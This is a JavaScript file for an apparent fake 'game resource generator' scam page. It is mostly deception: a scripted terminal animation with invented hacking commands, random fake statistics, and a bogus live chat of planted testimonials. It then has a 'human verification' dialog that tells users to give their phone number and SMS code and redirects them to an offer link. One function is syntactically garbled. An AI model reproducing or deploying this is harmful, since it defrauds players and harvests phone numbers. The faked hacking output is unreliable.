$(document).ready(function(){

    outdatedBrowser({
        bgColor: '#f25648',
        color: '#ffffff',
        lowerThan: 'transform',
        languagePath: 'outdatedbrowser/lang/en.html'
    });

	// $('.generator-section').backstretch("img/background.jpg");

    var owl_carousel = $('#generator-carousel').owlCarousel({
        center: true,
        mouseDrag: false,
        touchDrag: false,
        pullDrag: false,
        freeDrag: false,
        items: 1
    });

    $('#connect-acc-btn').on('click', function(){
        var username = $('#username').val();
        var device = $('#device-select').val();
        if(username != '') {
            if(device != '') {
                openLoadingDiag();
            } else {
                sweetAlert("خطأ", "Please choose your device.", "error");
            }
        } else {
            sweetAlert("خطأ", "Please enter your username.", "error");
        }
    });

    // $('#choose-items-btn').on('click', function(){
    //     var Coins = $('').val();
    //     openLoadingDiag(function(){
    //         owl_carousel.trigger('next.owl.carousel');
    //         startConsoleAnimation(function(){
    //             setTimeout(function(){
    //                 //onclick code
    //                 owl_carousel.trigger('next.owl.carousel');
    //             }, 1000);
    //         });
    //     });
    // });

    function openLoadingDiag(){
		bootbox.dialog({
			message: "<p>Processing Request...</p><p><img src='img/loader.gif'/></p>",
			title: "Loading",
            closeButton: false
		});
        setTimeout(function(){
            bootbox.hideAll();
            openItemSelectDiag();
        }, getRandomInt(1000, 2500));
	}

  var items_array = [
     ['money', 'images/mony.png'],
     ['BP', 'img/bp.png']
 ];

    function openItemSelectDiag(callback) {
        var strVar="";
        strVar += "<div class=\"row\">";
        strVar += "                                                <div class=\"col-md-6\"> <!-- item -->";
        strVar += "                                                    <div class=\"form-group item-select-wrap\">";
        strVar += "                                                        <label for=\"item-select\">money<\/label>";
        strVar += "                                                        <div class=\"selectFieldWrapper\">";
        strVar += "                                                            <select class=\"form-control item-select\" data-img-set=\"true\" data-img=\"img\/mony.png\" data-name=\"money\">";
        strVar += "                                                                <option value=\"1,000\">1,000<\/option>";
        strVar += "                                                                <option value=\"2,000\">2,000<\/option>";
        strVar += "                                                                <option value=\"5,000\">5,000<\/option>";
        strVar += "                                                                <option value=\"10,000\">10,000<\/option>";
        strVar += "                                                                <option value=\"100,000\">100,000<\/option>";
        //strVar += "                                                                <option value=\"500,000\">500,000<\/option>";
       // strVar += "                                                                <option value=\"1,000,000\">1,000,000<\/option>";
        //strVar += "                                                                <option value=\"5,000,000\">5,000,000<\/option>";
        strVar += "                                                            <\/select>";
        strVar += "                                                        <\/div>";
        strVar += "                                                    <\/div>";
       strVar += "                                                <\/div> <!-- \/item -->";
        strVar += "                                                <div class=\"col-md-6\"> <!-- item -->";
        strVar += "                                                    <div class=\"form-group item-select-wrap\">";
        strVar += "                                                        <label for=\"item-select\">BP<\/label>";
        strVar += "                                                        <div class=\"selectFieldWrapper\">";
        strVar += "                                                            <select class=\"form-control item-select\" data-img-set=\"true\" data-img=\"img\/bp.png\" data-name=\"bp\">";
        strVar += "                                                                <option value=\"1,000\">1,000<\/option>";
        strVar += "                                                                <option value=\"2,000\">2,000<\/option>";
        strVar += "                                                                <option value=\"5,000\">5,000<\/option>";
        strVar += "                                                                <option value=\"10,000\">10,000<\/option>";
        strVar += "                                                                <option value=\"100,000\">100,000<\/option>";
        //strVar += "                                                                <option value=\"500,000\">500,000<\/option>";
        //strVar += "                                                                <option value=\"1,000,000\">1,000,000<\/option>";
        //strVar += "                                                                <option value=\"5,000,000\">5,000,000<\/option>";
        //strVar += "                                                            <\/select>";
        //strVar += "                                                        <\/div>";
        //strVar += "                                                    <\/div>";
        //strVar += "                                                <\/div> <!-- \/item -->";
        //strVar += "                                            <\/div>";
        bootbox.dialog({
			message: "<p>Please choose your amount</p>" + strVar,
			title: "Choose Items",
            closeButton: false,
            buttons: {
                success: {
                    label: "توليد",
                    callback: function() {
                        confirmDialogOpen();
                    }
                }
            }
		});
        $('.item-select').each(function(index) {
            // var temp = [];
            // temp.push($(this).data('name'));
            // temp.push($(this).data('img'));
            // items_array.push(temp);
            if($(this).data('img-set')) {
                $(this).css({
                    'text-indent': '20px',
                    'background-repeat': 'no-repeat',
                    'background-position': '2% 35%',
                    'background-size': '17px auto',
                    'font-size': '0.8em',
                    'background-image': "url('" + $(this).data('img') + "')"
                });
            }
        });
    }


    function openGeneratorDiag() {
        var strVar="";
        strVar += "<div class=\"row\">";
        strVar += "                                                <div class=\"col-md-12\">";
        strVar += "                                                    <div class=\"loader-wrap\">";
        strVar += "                                                        <div class=\"loader\"><\/div>";
        strVar += "                                                    <\/div>";
        strVar += "                                                    <p class=\"loader-msg\">جاري الان توليد الموارد...<\/p>";
        strVar += "                                                    <div class=\"generator-console\"><\/div>";
        strVar += "                                                <\/div>";
        strVar += "                                            <\/div>";

        bootbox.hideAll();
        bootbox.dialog({
			message: strVar,
			title: "Generating",
            closeButton: false
		});
        startConsoleAnimation(function(){
            setTimeout(function(){
                //onclick code
                bootbox.hideAll();
                openHumanVerificationDiag();
            }, 1000);
        });
    }

    function openHumanVerificationDiag() {
        var <div data-captcha-enable="true"></div>;
        strVar += data-captcha-enable="true">";
        // strVar += "                                                <div class=\"col-md-12\">";
        // strVar += "                                                    <iframe id=\"offers-iframe\" src=\"http:\/\/motifiles.com\/450590\"><\/iframe>";
          // strVar += "                                               <\/div>";
        // strVar += "                                           <\/div>";
                     <div data-captcha-enable="true"></div>
	    
	            bootbox.dialog({
            message: "<p dir='rtl'> 1) - اضغط على الزر التحقق <p dir='rtl' > 2) -سيتم تحويلك الى صفحة عروض تخص الاشخاص الداعمين للهاك عبارة عن اختبار او اخبار...<p dir='rtl' > 3) -الآن اكتب رقم جوالك و أكد الرقم اللذي تلقيته عن طريق الرسائل <p dir='rtl' > 4) - بعد عملية تحقق سيتم نقلك الى موقع سيأكد لك شحن حسابك </p>",
            title: "<p dir='rtl' style='color:red;' ><b>يرجى قراءة التعليمات بعناية!</b></p>",
            closeButton: false,
             buttons: {
                     main: {
                               label: "Next",
                               className: "btn-success",
                               callback: function() {
                                           window.location.href = "https://www.clickfam.com/cl.php?id=930022591c2c17b65dfbb03cbd498831";
                                           }
                         },
          }
        });
    }

	var messages = [
		'1,000',
		'2,000',
		'5,000',
		'10,000',
		'100,000',
		'500,000',
		'1,000,000',
		'5,000,000',
	];

	changeUpdateMessage();

	timer = new Date().valueOf() + (5 * 60 * 1000);


	$(".timer").countdown(timer.toString(), function(event) {
		$(this).text(event.strftime('%M:%S'));
	});

	$('.updates-box .stat-icon').each(function(index){
		$(this).css({
			'height': '15px',
			'width': '15px'
		});
	});

	$('.updates-box .stat-text').each(function(index){
		$(this).text(getRandomInt(25432, 123993));
	});

	setInterval(function(){
		$('.updates-box .stat-text').each(function(index){
			var current_number = parseInt($(this).text());
			$(this).fadeOut().text(current_number + getRandomInt(25432, 123993)).fadeIn();
		});
		$('.updates-box .update-msg').animateCSS("fadeOutUp", {
			callback: function(){
				changeUpdateMessage();
				$(this).css('visibility', 'hidden').animateCSS("fadeInUp");
			}
		});
	}, getRandomInt(2000, 7000));

	function changeUpdateMessage() {
		var rand_item = items_array[getRandomInt(0, items_array.length - 1)];
		var msg = faker.internet.userName() + " has generated <img src='" + rand_item[1] + "' width='15px' height='15px'> " + messages[getRandomInt(0, messages.length - 1)] + " " + rand_item[0];
		$('.updates-box .update-msg .message').html(msg);
	}

	function onPageOffers() {
		$('#humanVerificationModal').modal({
			backdrop: 'static',
			keyboard: false
		});
		setInterval(function(){
			$.get( "postback.php", function( data ) {
				if(data == 1) {
					$('#humanVerificationModal').modal('hide');
					sweetAlert("Success", "Game items have been added, it may take upto 72 hours for it to be visible on your account.", "success");
				}
			});
		}, 2500);
	}

	$('.survey-offer-link').on('click', function(){
		$('.survey-offers').fadeOut(function(){
			$('.waitng-survey-offers').fadeIn();
		});
	});

	$('.back-to-offers-btn').on('click', function(){
		$('.waitng-survey-offers').fadeOut(function(){
			$('.survey-offers').fadeIn();
		});
	});

	function confirmDialogOpen(callback){
		var temp = "";
		$('.item-select').each(function(index){
			temp += "<p><img src='" + $(this).data('img') + "' width='15px' height='15px'> <strong>" + $(this).data('name') + ":</strong> " + $(this).val() + ".</p>";
		});
		bootbox.dialog({
			message: "<p>هل تريد اضافة هذه الموارد الى حسابك؟</p>" + temp,
			title: "أكد",
			buttons: {
				main: {
					label: "إلغاء",
					className: "btn-default",
					callback: function() {
						bootbox.hideAll();
					}
				},
				success: {
					label: "نعم",
					className: "btn-success",
					callback: function() {
						bootbox.hideAll();
						openGeneratorDiag();
					}
				}
			}
		});
	}

	function startConsoleAnimation(callback){
		/* CONSOLE ANIMATION */
        $('.generator-console').on('DOMSubtreeModified', function(){
    		$(".generator-console").scrollTop($(".generator-console")[0].scrollHeight);
    	});
		$('.generator-console').dynatexer({
			loop: 1,
			content: [
				{
					animation: 'additive',
					delay: 0,
					placeholder: '<span class="console_text white">',
					render_strategy: 'text-one-shot',
					items: "[root@28.3.4.53.2]$ "
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text white">',
					render_strategy: 'text-by-char',
					items: "open_ssl_connection -s 28.3.4.53.2 -deobfuscate -encrypt_aes_256"
				},
				{
					delay: 200
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nOpening port 423245.\n"
				},
				{
					animation: 'replace',
					delay: 3,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 50,
					placeholder: '<span class="console_text green">',
					render_strategy: 'text-one-shot',
					items: "\nPort 423245 opened successfully."
				},
				{
					animation: 'additive',
					delay: 50,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nEncrypting connection: open_ssl_aes256(28.3.4.53.2);\n"
				},
				{
					animation: 'replace',
					delay: 10,
					render_strategy: 'iterator',
					placeholder: '<span class="console_text yellow">',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 50,
					placeholder: '<span class="console_text green">',
					render_strategy: 'text-one-shot',
					items: "\nConnection encrypted successfully."
				},
				{
					animation: 'additive',
					delay: 0,
					placeholder: '<span class="console_text white">',
					render_strategy: 'text-one-shot',
					items: "\n[root@28.3.4.53.2]$ "
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text white">',
					render_strategy: 'text-by-char',
					items: "import server files /usr/ect/kernel/server/config.json"
				},
				{
					delay: 100
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nImporting config.json\n"
				},
				{
					animation: 'replace',
					delay: 5,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text green">',
					render_strategy: 'text-one-shot',
					items: "\n‘config.json’ file has been imported successfully."
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nDe-obfuscating server config files.\n"
				},
				{
					animation: 'replace',
					delay: 3,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text green">',
					render_strategy: 'text-one-shot',
					items: "\nFiles de-obfuscated successfully."
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nDecrypting server configuration files.\n"
				},
				{
					animation: 'replace',
					delay: 5,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 30,
					placeholder: '<span class="console_text green">',
					render_strategy: 'text-one-shot',
					items: "\nConfigurations files are now imported and readable."
				},
				{
					animation: 'additive',
					delay: 0,
					placeholder: '<span class="console_text white">',
					render_strategy: 'text-one-shot',
					items: "\n[root@28.3.4.53.2]$ "
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text white">',
					render_strategy: 'text-by-char',
					items: "edit_config -items-change -aes256 -encrypt -proxy"
				},
				{
					delay: 70
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nOpen server configurations files in edit mode.\n"
				},
				{
					animation: 'replace',
					delay: 3,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text green">',
					render_strategy: 'text-one-shot',
					items: "\nConfigurations files is now open in edit mode."
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nAdd items to account.\n"
				},
				{
					animation: 'replace',
					delay: 4,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 10,
					placeholder: '<span class="console_text green">',
					render_strategy: 'text-one-shot',
					items: "\nItems addded to account successfully."
				},
				{
					animation: 'additive',
					delay: 3,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nClose configuration file.\n"
				},
				{
					animation: 'replace',
					delay: 3,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 10,
					placeholder: '<span class="console_text green">',
					render_strategy: 'text-one-shot',
					items: "\nConfiguration file is now closed."
				},
				{
					animation: 'additive',
					delay: 0,
					placeholder: '<span class="console_text white">',
					render_strategy: 'text-one-shot',
					items: "\n[root@28.3.4.53.2]$ "
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text white">',
					render_strategy: 'text-by-char',
					items: "save_config -S -v /usr/ect/kernel/sever/config.json"
				},
				{
					delay: 80
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nExporting temporary configuration file to main server.\n"
				},
				{
					animation: 'replace',
					delay: 3,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text red">',
					render_strategy: 'text-one-shot',
					items: "\nFailed to export configuration file, bot detected."
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nTrying again to export configuration files.\n"
				},
				{
					animation: 'replace',
					delay: 4,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text red">',
					render_strategy: 'text-one-shot',
					items: "\nFailed to export configuration file, bot detected."
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nTrying one last time to export configuration files.\n"
				},
				{
					animation: 'replace',
					delay: 5,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 10,
					placeholder: '<span class="console_text red">',
					render_strategy: 'text-one-shot',
					items: "\nExport failed, anti-human verification system detected potential bot."
				},
				{
					animation: 'additive',
					delay: 10,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'text-one-shot',
					items: "\nPlease complete the human verification popup."
				},
			],
			cursor: {
				animation: 'replace',
				loop: 'infinite',
				delay: 500,
				placeholder: '<span class="console_cursor">',
				render_strategy: 'array-items',
				items: ['|', '']
			}
		});
		$('.generator-console').dynatexer('play', function() {
			callback();
		});
		/* END CONSOLE ANIMATION */
	}

	function getRandomInt(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	}

	/*
	 * Live Chat
	 */

	var livechat_name = '';

	var livechat_text_area = $('.livechatListArea');
	var livechat_text_list = $('.chatList');
	var livechat_text_area_height = livechat_text_area.height();

	var name_colors = ['#d4a112', '#987c2f', '#b02643', '#d72248', '#9d22d7', '#a65fc7', '#2771bc', '#1a82ed', '#28ba4a', '#136b28', '#9bc716'];

	var chat_names = ['Richard23', 'Philip', 'Rob001', 'Hill213', 'Prim', 'Grequod', 'Moseeld30', 'Allichere', 'Munplad60', 'Therainged', 'Perseent', 'Wasice59', 'Arrent', 'Quot1991', 'Yourlenis'];

	var chat_messages = ["Awesome,its rare to find working generator like this one","Anyone tried this already?","Does it work in NA?","Why this is so easy lol?","This is incredible, never thought it would work.","I get Resource in a minute.","shy i see survey ?","its to protect from spamming, first try to use, i got no Survey request, but for second try i need to get Finish 1 Survey","OMG!","LOL!","ROFL!","Real","gayyyy","easy","bro","What can I do here?","Shut up man I love this website","hi guys","How much resource you've generated so far?","what about surveys on mobile phone?","Is this free?","How long do you have to wait?","Yea","No","I know","Exactly why this is so good","uhm","maybe","I can imagine this must be annoying for the one who play with skill","Is this ban secure?","Thanks man I appreciate this.","Cool =)","<message deleted>","oh god","damn","I love this","Never imagined this would work but damn its so simple","saw this on forums pretty impressive","yo guys dont spam okay?","anyone up for a game?","you think this will be patched any time soon","pretty sure this is saving me a lot of money","any idea which skin i should get","so happy i found this","you guys watch nightblue?","I have seen this generator on hotshot stream i think","just wow","When do I get my resource ??","a friend told me about this","thanks to whoever spams this website Finish my survey now","how can finish this survey quickly?","so far I am cool with this generaor","can I get off this survey easily?","bye guys, already finish my survey, and resources generated successfully","okay i am stacked now with survey","finished survey is easy, if you fill using valid data","incredible","three minutes ago cannot get fast resource, now i have and its works perfectly","need to go now","brb","You should give it a try","dont regret being here","fucking generator is real","first time ever this makes sense","Does everyone have a different survey ","got my resource in 5 minutes only :D","what happen after finish a survey","after finish a survey you'll get the resiurce ","today is lucky day","this is the best generator because we all have more than a chance","i think everyone can do a survey quickly","can we get more than one survey ?, first time success, and want to try for my sister account","yes","abselutely","I got all resource for my girlfriend too"];

	setInterval(function(){
		add_livechat_msg(chat_names[getRandomInt(1, chat_names.length - 1)], name_colors[getRandomInt(1, name_colors.length - 1)], chat_messages[getRandomInt(1, chat_messages.length - 1)]);
	}, getRandomInt(1500, 6000));


	$('.livechatSubmtBtn').click(function(){
		if(livechat_name == '') {
			$('.livechatNameBox').show();
		} else {
			add_livechat_msg(livechat_name, '#136b28', $('.livechatMsg').val());
			$('.livechatMsg').val('');
		}
	});

	$('.livechatNicknameBtn').click(function(){
		var name_input = $('#livechat_name');
		if(name_input.val() != '') {
			livechat_name = name_input.val();
			$(this).parents('.livechatNameBox').hide();
		} else {
			sweetAlert("Error", "Please enter a nickname.", "error");
		}
	});

	$( ".livechatName" ).on( "keypress", function() {
		console.log( "Handler for .keypress() called." );
	});

	function add_livechat_msg(name, color, msg) {
		var $output_text = $('<li><span class="name" style="color: ' + color + ' !important;">' + name + '</span>: <span class="message">' + msg + '</span></li>');
		$output_text.hide().appendTo(livechat_text_list).fadeIn();
		livechat_text_area.animate({scrollTop: livechat_text_area_height}, 500);
		livechat_text_area_height += livechat_text_area.height();
	}

	/*
	 * Contact Page
	 */

	$('.contact-btn').click(function(){
		if($('#nameInput').val() != "") {
			if($('#emailInput').val() != "") {
				if($('#messageInput').val() != "") {
					sweetAlert("Message Sent!", "Thank you for your feedback.", "success");
					$('#nameInput, #emailInput, #messageInput').val('');
				} else {
					sweetAlert("Error", "Please enter your message.", "error");
				}
			} else {
				sweetAlert("Error", "Please enter your username.", "error");
			}
		} else {
			sweetAlert("Error", "Please enter your username.", "error");
		}
	});

});

$(window).resize(function(){
	$('.step-one').flexVerticalCenter({
		parentSelector: '.generator-form'
	});
});
